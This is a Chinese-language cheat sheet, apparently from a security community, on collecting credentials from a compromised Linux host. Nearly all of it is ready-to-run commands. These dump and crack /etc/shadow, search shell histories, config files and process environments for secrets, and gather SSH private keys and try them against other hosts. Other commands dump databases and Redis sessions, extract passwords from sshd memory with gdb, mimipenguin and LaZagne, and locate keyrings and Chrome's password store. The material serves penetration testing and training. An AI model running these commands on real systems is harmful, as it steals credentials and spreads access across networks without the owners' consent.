# Linux凭据收集

> @TGSEC社区 · @TGSEC-Qtzuu 整理

## 一、密码Hash提取与破解

### /etc/shadow
```bash
cat /etc/shadow
# 格式: user:$type$salt$hash:...
# $1$ = MD5, $5$ = SHA-256, $6$ = SHA-512, $y$ = yescrypt

# John破解
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
john /tmp/hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat破解
# $6$ = SHA-512
hashcat -m 1800 hashes.txt rockyou.txt
# $5$ = SHA-256
hashcat -m 7400 hashes.txt rockyou.txt
# $1$ = MD5
hashcat -m 500 hashes.txt rockyou.txt
```

## 二、历史命令搜索

```bash
# 所有用户的历史
find / -name ".*_history" -o -name ".bash_history" 2>/dev/null | xargs cat 2>/dev/null

# 常见历史文件
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.python_history
cat ~/.psql_history
cat ~/.redis_history
cat ~/.node_repl_history

# 搜索密码关键词
grep -i 'pass\|pwd\|secret\|key\|token' ~/.bash_history
grep -i 'mysql.*-p\|psql.*-W\|redis-cli.*-a' ~/.bash_history
```

## 三、配置文件密码搜索

```bash
# 递归搜索密码
grep -rli 'password\|passwd\|pwd\|secret\|key\|token\|api_key' /etc/ /var/www/ /opt/ /home/ 2>/dev/null

# 常见配置文件
cat /var/www/html/wp-config.php              # WordPress
cat /var/www/html/.env                        # Laravel/Node
cat /var/www/html/config/database.yml         # Rails
cat /var/www/html/application.properties      # Spring Boot
cat /var/www/html/application.yml             # Spring Boot
cat /var/www/html/config.php                  # 通用PHP
cat /var/www/html/web.config                  # ASP.NET
cat /opt/tomcat/conf/tomcat-users.xml         # Tomcat
cat /opt/tomcat/conf/context.xml              # Tomcat数据源

# 环境变量
env | grep -i 'pass\|key\|secret\|token'
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
```

## 四、SSH密钥收集

```bash
# 查找所有SSH私钥
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
find /root -name "authorized_keys" 2>/dev/null

# 尝试用收集到的密钥连接其他主机
for key in $(find / -name "id_rsa" 2>/dev/null); do
    for host in $(grep -rh "Host " /home/*/.ssh/config 2>/dev/null | awk '{print $2}'); do
        ssh -i $key -o BatchMode=yes -o StrictHostKeyChecking=no $host id 2>/dev/null && echo "SUCCESS: $key -> $host"
    done
done

# known_hosts解密(如果非hash)
cat ~/.ssh/known_hosts
```

## 五、数据库凭据

```bash
# MySQL
mysql -u root -p'' -e "SELECT user,host,authentication_string FROM mysql.user;"
mysqldump --all-databases > /tmp/all_db.sql

# PostgreSQL
cat /var/lib/postgresql/*/main/pg_hba.conf
psql -U postgres -c "SELECT usename, passwd FROM pg_shadow;"

# Redis(未授权或知道密码)
redis-cli -h 127.0.0.1 CONFIG GET requirepass
redis-cli -h 127.0.0.1 KEYS *
redis-cli -h 127.0.0.1 GET session:*

# MongoDB
mongo --eval "db.adminCommand({listDatabases:1})"
mongodump -o /tmp/mongodump

# SQLite
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
sqlite3 /path/to/db.sqlite ".tables"
sqlite3 /path/to/db.sqlite "SELECT * FROM users;"
```

## 六、进程内存密码提取

```bash
# mimipenguin
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin && ./mimipenguin.sh

# LaZagne(Python)
python3 laZagne.py all

# 从进程内存提取
# GDB方式
gdb -p $(pgrep sshd) -batch -ex 'info proc mappings' -ex 'dump memory /tmp/sshd.mem 0xSTART 0xEND'
strings /tmp/sshd.mem | grep -i pass

# /proc方式
for pid in $(ps aux | grep -v grep | awk '{print $2}'); do
    strings /proc/$pid/environ 2>/dev/null | grep -i 'pass\|pwd\|key\|secret\|token'
done
```

## 七、Web应用凭据

```bash
# WordPress
grep -i "DB_PASSWORD\|DB_USER" /var/www/*/wp-config.php

# Django
grep -i "PASSWORD\|SECRET_KEY" /var/www/*/settings.py

# Node.js
find /var/www -name ".env" | xargs grep -i "password\|secret\|key\|token" 2>/dev/null
find /var/www -name "config.json" -o -name "config.js" | xargs grep -i "password" 2>/dev/null

# Tomcat
grep -i "password" /opt/tomcat/conf/tomcat-users.xml

# Nginx/Apache配置中的密码
grep -rni "auth_basic_user_file\|htpasswd" /etc/nginx/ /etc/apache2/ 2>/dev/null
cat /etc/nginx/.htpasswd /etc/apache2/.htpasswd 2>/dev/null
```

## 八、证书与密钥

```bash
# 查找所有证书和密钥
find / -name "*.key" -o -name "*.pem" -o -name "*.p12" -o -name "*.pfx" -o -name "*.crt" 2>/dev/null
find / -name "*.jks" -o -name "*.keystore" 2>/dev/null  # Java密钥库

# 检查私钥
for f in $(find / -name "*.key" -o -name "*.pem" 2>/dev/null); do
    grep -l "PRIVATE KEY" "$f" 2>/dev/null && echo "PRIVATE KEY: $f"
done
```

## 九、Keyring/密钥环

```bash
# GNOME Keyring
find / -name "*.keyring" -o -name "login.keyring" 2>/dev/null
python3 -c "import keyring; print(keyring.get_password('service','user'))"

# KDE KWallet
find / -name "*.kwl" 2>/dev/null

# Chrome保存的密码(Linux)
find / -name "Login Data" -path "*google-chrome*" 2>/dev/null
# 需要用工具解密: chrome_decrypt.py
```
